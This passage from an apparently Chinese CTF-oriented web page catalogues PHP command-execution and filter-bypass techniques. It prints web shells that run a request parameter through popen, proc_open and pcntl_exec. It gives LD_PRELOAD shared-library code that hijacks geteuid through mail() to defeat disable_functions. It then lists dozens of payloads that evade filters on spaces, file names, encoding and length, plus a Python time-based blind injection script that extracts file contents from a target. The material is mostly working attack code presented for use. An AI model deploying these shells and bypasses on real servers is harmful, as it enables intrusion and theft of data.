</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span>$fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>($cmd, <span style="color:#e6db74">&#39;r&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ($s<span style="color:#f92672">=</span><span style="color:#a6e22e">fgets</span>($fp)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $s;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="proc_open">
  proc_open()
  <a class="anchor" href="#proc_open">#</a>
</h3>
<p><code>proc_open(string $cmd, array $descriptorspec, array &amp;$pipes, ?string $cwd = null, ?array $env = null, ?array $other_options = null): resource</code></p>
<p>cmd: 要执行的命令</p>
<p>descritorspec: 数组，指定要打开的文件描述符，0=&gt;标准输入，1=&gt;标准输出，2=&gt;标准错误</p>
<p>pipes: 数组，存储打开的文件描述符</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span>$descriptorspec <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;pipe&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;pipe&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">2</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#39;/tmp/error-output.txt&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$pipes <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>$process <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>($cmd, $descriptorspec, $pipes);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">stream_get_contents</span>($pipes[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>($pipes[<span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">proc_close</span>($process);
</span></span></code></pre></div><h3 id="pcntl_exec">
  pcntl_exec()
  <a class="anchor" href="#pcntl_exec">#</a>
</h3>
<p><code>pcntl_exec(string $path, array $args = [], array $envs = []): void</code></p>
<p>path: 必须是可执行文件的绝对路径或一个在第一行指定了一个可执行解释器的脚本（如#!/usr/bin/env php）。</p>
<p>args: 数组，参数列表</p>
<p>envs: 数组，环境变量</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pcntl_exec</span>(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>, [<span style="color:#e6db74">&#39;-c&#39;</span>, $cmd], []);
</span></span></code></pre></div><h2 id="ld_preload-绕过">
  LD_PRELOAD 绕过
  <a class="anchor" href="#ld_preload-%e7%bb%95%e8%bf%87">#</a>
</h2>
<h3 id="程序的链接">
  程序的链接
  <a class="anchor" href="#%e7%a8%8b%e5%ba%8f%e7%9a%84%e9%93%be%e6%8e%a5">#</a>
</h3>
<ul>
<li>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。</li>
<li>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</li>
<li>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</li>
</ul>
<p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。</p>
<h3 id="ld_preload">
  LD_PRELOAD
  <a class="anchor" href="#ld_preload">#</a>
</h3>
<p>LD_PRELOAD 是一个环境变量，它指定了在程序运行前要加载的动态链接库。</p>
<p>LD_PRELOAD 可以用来劫持系统调用，从而实现对程序的控制。</p>
<h3 id="绕过条件">
  绕过条件
  <a class="anchor" href="#%e7%bb%95%e8%bf%87%e6%9d%a1%e4%bb%b6">#</a>
</h3>
<ul>
<li>能上传自己的。so 文件</li>
<li>能控制环境变量（如 LD_PRELOAD) 的值，比如 putenv() 函数且未被禁止</li>
<li>存在可以控制 PHP 启动外部程序的函数并能执行，比如 mail()、imap_mail()、mb_send_mail()、error_log() 等</li>
</ul>
<h3 id="可利用函数">
  可利用函数
  <a class="anchor" href="#%e5%8f%af%e5%88%a9%e7%94%a8%e5%87%bd%e6%95%b0">#</a>
</h3>
<h4 id="mail内置函数">
  mail（内置函数）
  <a class="anchor" href="#mail%e5%86%85%e7%bd%ae%e5%87%bd%e6%95%b0">#</a>
</h4>
<p>mail 函数-&gt;调用/user/bin/sendmail-&gt;调用动态链接库 geteuid 函数</p>
<p>给 geteuid 重新赋值</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;echo success&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// system(&#34;cat /flag &gt; /tmp/flag&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">geteuid</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>编译为<code>1.so</code>文件</p>
<p>上传一个<code>1.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD=./1.so&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>上传并访问<code>1.php</code>即可执行</p>
<h5 id="把要执行的命令赋值到环境变量直接读取命令">
  把要执行的命令赋值到环境变量直接读取命令
  <a class="anchor" href="#%e6%8a%8a%e8%a6%81%e6%89%a7%e8%a1%8c%e7%9a%84%e5%91%bd%e4%bb%a4%e8%b5%8b%e5%80%bc%e5%88%b0%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e7%9b%b4%e6%8e%a5%e8%af%bb%e5%8f%96%e5%91%bd%e4%bb%a4">#</a>
</h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">geteuid</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cmd <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;cmd&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>) <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(cmd);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>编译为<code>2.so</code>文件</p>
<p>上传一个<code>2.php</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD=./2.so&#34;</span>);
</span></span><span style="display:flex;"><span>$out_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./out.txt&#39;</span>;
</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span>$evil_cmd <span style="color:#f92672">=</span> $cmd<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &gt; &#39;</span><span style="color:#f92672">.</span>$out_path<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; 2&gt;&amp;1&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $evil_cmd;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">putenv</span>(<span style="color:#e6db74">&#34;cmd=</span><span style="color:#e6db74">$cmd</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mail</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($out_path);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><h4 id="imagick扩展">
  imagick（扩展）
  <a class="anchor" href="#imagick%e6%89%a9%e5%b1%95">#</a>
</h4>
<h3 id="蚁剑绕过">
  蚁剑绕过
  <a class="anchor" href="#%e8%9a%81%e5%89%91%e7%bb%95%e8%bf%87">#</a>
</h3>
<p>加载插件-&gt;辅助工具-&gt;绕过 disable_functions</p>
<h2 id="操作系统连接符">
  操作系统连接符
  <a class="anchor" href="#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e8%bf%9e%e6%8e%a5%e7%ac%a6">#</a>
</h2>
<h3 id="linux">
  Linux
  <a class="anchor" href="#linux">#</a>
</h3>
<ul>
<li>
<p><code>;</code>：多命令顺序执行</p>
</li>
<li>
<p><code>&amp;</code>：多命令顺序执行</p>
</li>
<li>
<p><code>&amp;&amp;</code>：多命令逻辑与，前面的命令执行成功才执行后面的命令</p>
</li>
<li>
<p><code>|</code>：管道输出符，将前面的命令的输出作为后面的命令的输入，把前面命令的结果当成后面命令的参数。会执行，但是只会输出最后一个命令的结果</p>
<ul>
<li>例：<code>echo &quot;ls -l&quot; | /bin/bash</code></li>
</ul>
</li>
<li>
<p><code>||</code>：多命令逻辑或，前面的命令执行失败才执行后面的命令</p>
</li>
<li>
<p><code>%0a</code>：换行</p>
</li>
</ul>
<h3 id="windows">
  Windows
  <a class="anchor" href="#windows">#</a>
</h3>
<p>除<code>;</code>外，其他符号都可以使用</p>
<h2 id="空格过滤绕过">
  空格过滤绕过
  <a class="anchor" href="#%e7%a9%ba%e6%a0%bc%e8%bf%87%e6%bb%a4%e7%bb%95%e8%bf%87">#</a>
</h2>
<h3 id="ifs-代替空格内部字段分隔符">
  $IFS 代替空格（内部字段分隔符）
  <a class="anchor" href="#ifs-%e4%bb%a3%e6%9b%bf%e7%a9%ba%e6%a0%bc%e5%86%85%e9%83%a8%e5%ad%97%e6%ae%b5%e5%88%86%e9%9a%94%e7%ac%a6">#</a>
</h3>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>cat${IFS}/flag</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat$IFS/flag</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat$IFS$9/flag</code></p>
</li>
</ul>
<h3 id="大括号">
  大括号
  <a class="anchor" href="#%e5%a4%a7%e6%8b%ac%e5%8f%b7">#</a>
</h3>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>{cat,/flag}</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat$'\x20'/flag</code></p>
</li>
</ul>
<h3 id="重定向字符">
  重定向字符
  <a class="anchor" href="#%e9%87%8d%e5%ae%9a%e5%90%91%e5%ad%97%e7%ac%a6">#</a>
</h3>
<ul>
<li><code>cat&lt;/flag</code></li>
</ul>
<h3 id="09tab">
  %09（Tab）
  <a class="anchor" href="#09tab">#</a>
</h3>
<ul>
<li><code>cat /flag</code> -&gt; <code>cat%09/flag</code></li>
</ul>
<h2 id="文件名过滤绕过">
  文件名过滤绕过
  <a class="anchor" href="#%e6%96%87%e4%bb%b6%e5%90%8d%e8%bf%87%e6%bb%a4%e7%bb%95%e8%bf%87">#</a>
</h2>
<h3 id="通配符">
  通配符
  <a class="anchor" href="#%e9%80%9a%e9%85%8d%e7%ac%a6">#</a>
</h3>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /fla?</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /fla*</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /fla[g]</code></p>
</li>
</ul>
<h3 id="单双引号绕过">
  单双引号绕过
  <a class="anchor" href="#%e5%8d%95%e5%8f%8c%e5%bc%95%e5%8f%b7%e7%bb%95%e8%bf%87">#</a>
</h3>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /f&quot;&quot;lag</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /f''lag</code></p>
</li>
</ul>
<h3 id="反斜杠绕过">
  反斜杠绕过
  <a class="anchor" href="#%e5%8f%8d%e6%96%9c%e6%9d%a0%e7%bb%95%e8%bf%87">#</a>
</h3>
<p>反斜杠把特殊字符去掉功能性，单纯表示为字符串</p>
<ul>
<li><code>cat /flag</code> -&gt; <code>cat /fla\g</code></li>
</ul>
<h3 id="特殊变量">
  特殊变量
  <a class="anchor" href="#%e7%89%b9%e6%ae%8a%e5%8f%98%e9%87%8f">#</a>
</h3>
<p>$1 到$9、$@、$*</p>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /f$1la$9g</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>cat /f$*\lag</code></p>
</li>
</ul>
<h3 id="内联执行拼接">
  内联执行（$拼接）
  <a class="anchor" href="#%e5%86%85%e8%81%94%e6%89%a7%e8%a1%8c%e6%8b%bc%e6%8e%a5">#</a>
</h3>
<ul>
<li><code>cat /flag</code> -&gt; <code>a=f;cat $alag</code></li>
</ul>
<h3 id="利用-linux-中的环境变量">
  利用 linux 中的环境变量
  <a class="anchor" href="#%e5%88%a9%e7%94%a8-linux-%e4%b8%ad%e7%9a%84%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo $PATH
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span>
</span></span></code></pre></div><ul>
<li><code>cat /flag</code> -&gt; <code>cat ${PATH:0:1}f${PATH:5:1}ag</code></li>
</ul>
<h2 id="常见文件读取命令绕过">
  常见文件读取命令绕过
  <a class="anchor" href="#%e5%b8%b8%e8%a7%81%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e5%91%bd%e4%bb%a4%e7%bb%95%e8%bf%87">#</a>
</h2>
<ul>
<li>
<p><code>cat</code></p>
</li>
<li>
<p><code>tac</code>: 从最后一行开始显示，可以看出<code>tac</code>是<code>cat</code>的倒着写</p>
</li>
<li>
<p><code>nl</code>: 显示的时候，顺便输出行号</p>
</li>
<li>
<p><code>more</code>: 一页一页的显示文件内容</p>
</li>
<li>
<p><code>less</code>: 与<code>more</code>类似，但是比<code>more</code>更好的是，他可以往前翻页</p>
</li>
<li>
<p><code>head</code>: 只看头几行</p>
</li>
<li>
<p><code>tail</code>: 只看尾巴几行</p>
</li>
<li>
<p><code>od</code>: 以二进制的方式读取文件（转换成字符：<code>od -A d -c /flag</code>）</p>
</li>
<li>
<p><code>strings</code>: 以字符串的方式读取文件</p>
</li>
<li>
<p><code>xxd</code>: 以 16 进制的方式读取文件</p>
</li>
<li>
<p><code>iconv</code>: 转换文件编码</p>
</li>
<li>
<p><code>base64</code>: 以 base64 的方式读取文件（还有<code>base32</code>、<code>base58</code>）</p>
</li>
<li>
<p><code>sort</code>: 排序</p>
</li>
<li>
<p><code>uniq</code>: 去重</p>
</li>
<li>
<p><code>file -f</code>: 识别文件类型，-f 参数表示识别文件中表示的文件路径，报错就可以显示出文件内容（no such file or directory）</p>
</li>
<li>
<p><code>grep</code>: 用法：<code>grep { /flag</code>，表示在<code>flag</code>文件中查找<code>{</code>字符串</p>
</li>
</ul>
<h2 id="编码绕过">
  编码绕过
  <a class="anchor" href="#%e7%bc%96%e7%a0%81%e7%bb%95%e8%bf%87">#</a>
</h2>
<h3 id="base64">
  base64
  <a class="anchor" href="#base64">#</a>
</h3>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>echo Y2F0IC9mbGFn | base64 -d | sh</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; `echo Y2F0IC9mbGFn | base64 -d` （Linux 中反引号表示执行命令）</p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>$(echo Y2F0IC9mbGFn | base64 -d)</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>printf &quot;Y2F0IC9mbGFn&quot; | base64 -d | sh</code></p>
</li>
</ul>
<h3 id="base32">
  base32
  <a class="anchor" href="#base32">#</a>
</h3>
<ul>
<li><code>cat /flag</code> -&gt; <code>echo MNQXIIBPMZWGCZY= | base32 -d | sh</code></li>
</ul>
<h3 id="base58">
  base58
  <a class="anchor" href="#base58">#</a>
</h3>
<ul>
<li><code>cat /flag</code> -&gt; <code>echo 2GNQyDr4iit1c | base58 -d | sh</code></li>
</ul>
<h3 id="hex-编码">
  HEX 编码
  <a class="anchor" href="#hex-%e7%bc%96%e7%a0%81">#</a>
</h3>
<ul>
<li><code>cat /flag</code> -&gt; <code>echo 636174202f666c6167 | xxd -r -p | sh</code></li>
</ul>
<h3 id="shellcode">
  shellcode
  <a class="anchor" href="#shellcode">#</a>
</h3>
<ul>
<li>
<p><code>cat /flag</code> -&gt; <code>echo -ne &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot; | sh</code></p>
</li>
<li>
<p><code>cat /flag</code> -&gt; <code>printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot; | sh</code></p>
</li>
</ul>
<h2 id="无回显时间盲注">
  无回显时间盲注
  <a class="anchor" href="#%e6%97%a0%e5%9b%9e%e6%98%be%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8">#</a>
</h2>
<ul>
<li><code>cat /flag</code> -&gt; <code>if [ $(cat /flag | awk NR==1 | cut -c 1) == a ];then sleep 2;fi</code>
<ul>
<li><code>awk NR==1</code>表示输出第一行</li>
<li><code>cut -c 1</code>表示输出第一个字符</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_exp</span>(exp):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> exp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.1/1.php&#34;</span>
</span></span><span style="display:flex;"><span>param <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat /flag&#34;</span>
</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">10</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> letter <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> acc <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">126</span>):
</span></span><span style="display:flex;"><span>            exp <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;if [ $(</span><span style="color:#e6db74">{</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74"> | awk NR==</span><span style="color:#e6db74">{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74"> | cut -c </span><span style="color:#e6db74">{</span>letter<span style="color:#e6db74">}</span><span style="color:#e6db74">) == </span><span style="color:#e6db74">{</span>chr(acc)<span style="color:#e6db74">}</span><span style="color:#e6db74"> ];then sleep 3;fi&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(exp)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;?</span><span style="color:#e6db74">{</span>param<span style="color:#e6db74">}</span><span style="color:#e6db74">=</span><span style="color:#e6db74">{</span>handle_exp(exp)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># data = {param: cmd}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># res = requests.post(url=url, data=data)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">TimeoutError</span>:
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">+=</span> chr(acc)
</span></span><span style="display:flex;"><span>                print(chr(acc))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(result)
</span></span></code></pre></div><h2 id="长度过滤绕过">
  长度过滤绕过
  <a class="anchor" href="#%e9%95%bf%e5%ba%a6%e8%bf%87%e6%bb%a4%e7%bb%95%e8%bf%87">#</a>
</h2>
<h3 id="相关命令">
  相关命令
  <a class="anchor" href="#%e7%9b%b8%e5%85%b3%e5%91%bd%e4%bb%a4">#</a>
</h3>
<ul>
<li>
<p><code>&gt;</code>和<code>&gt;&gt;</code>：重定向符，<code>&gt;</code>表示覆盖，<code>&gt;&gt;</code>表示追加</p>
<ul>
<li><code>&gt; test</code>可以创建一个名为 test 的文件，类似 touch 命令</li>
</ul>
</li>
<li>
<p><code>\</code>：换行符</p>
</li>
<li>
<p><code>ls -t</code>：按照时间排序，最新的文件在最前面。</p>
<ul>
<li>默认按照文件名 ascii 码排序</li>
<li>注意时间只能精确到秒</li>
</ul>
</li>
<li>
<p><code>dir</code>：列出文件名，好处：不换行，&ldquo;d&quot;排名靠前</p>
<ul>
<li><code>$(dir *)</code> 如果第一个文件名是命令的话就会执行命令，后面的文件名作为参数输入</li>
</ul>
</li>
<li>
<p><code>rev</code>：输出文本内容但是反转每一行的字符顺序</p>
</li>
</ul>
<h3 id="组合运用">
  组合运用
  <a class="anchor" href="#%e7%bb%84%e5%90%88%e8%bf%90%e7%94%a8">#</a>
</h3>
<p>对命令长度有限制时，把一些很短的文件名拼接成可执行命令</p>
<ul>
<li>
<p><code>&gt;</code> 创建很短的文件名</p>
</li>
<li>
<p><code>ls -t</code> 按时间顺序列出文件名，按行存储</p>
</li>
<li>
<p><code>\</code> 连接换行命令</p>
</li>
<li>
<p><code>sh</code> 从文件中读取命令</p>
</li>
</ul>
<p>第一步：创建文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;ag
</span></span><span style="display:flex;"><span>&gt;fl<span style="color:#ae81ff">\\</span>
</span></span><span style="display:flex;"><span>&gt;<span style="color:#e6db74">&#34;t \\&#34;</span>
</span></span><span style="display:flex;"><span>&gt;ca<span style="color:#ae81ff">\\</span>
</span></span></code></pre></div><p>第二步：将命令拼接到文件中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ls -t&gt;x
</span></span></code></pre></div><p>第三步：执行命令</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sh &lt; x
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或</span>
</span></span><span style="display:flex;"><span>sh x
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或</span>
</span></span><span style="display:flex;"><span>. x
</span></span></code></pre></div><h3 id="长度限制为-5-的绕过">
  长度限制为 5 的绕过
  <a class="anchor" href="#%e9%95%bf%e5%ba%a6%e9%99%90%e5%88%b6%e4%b8%ba-5-%e7%9a%84%e7%bb%95%e8%bf%87">#</a>
</h3>
<h4 id="1-构造-ls--ty">
  1. 构造 ls -t&gt;y
  <a class="anchor" href="#1-%e6%9e%84%e9%80%a0-ls--ty">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;ls<span style="color:#ae81ff">\\</span> <span style="color:#75715e"># &#34;ls\&#34;</span>
</span></span><span style="display:flex;"><span>ls&gt;_ <span style="color:#75715e"># 将 ls\写入_文件</span>
</span></span><span style="display:flex;"><span>&gt;<span style="color:#ae81ff">\ \\</span> <span style="color:#75715e"># &#34; \&#34;</span>
</span></span><span style="display:flex;"><span>&gt;-t<span style="color:#ae81ff">\\</span> <span style="color:#75715e"># &#34;-t\&#34;</span>
</span></span><span style="display:flex;"><span>&gt;<span style="color:#ae81ff">\&gt;</span>y <span style="color:#75715e"># &#34;&gt;y&#34;</span>
</span></span><span style="display:flex;"><span>ls&gt;&gt;_
</span></span></code></pre></div><h4 id="2-分解命令创建文件">
  2. 分解命令，创建文件
  <a class="anchor" href="#2-%e5%88%86%e8%a7%a3%e5%91%bd%e4%bb%a4%e5%88%9b%e5%bb%ba%e6%96%87%e4%bb%b6">#</a>
</h4>
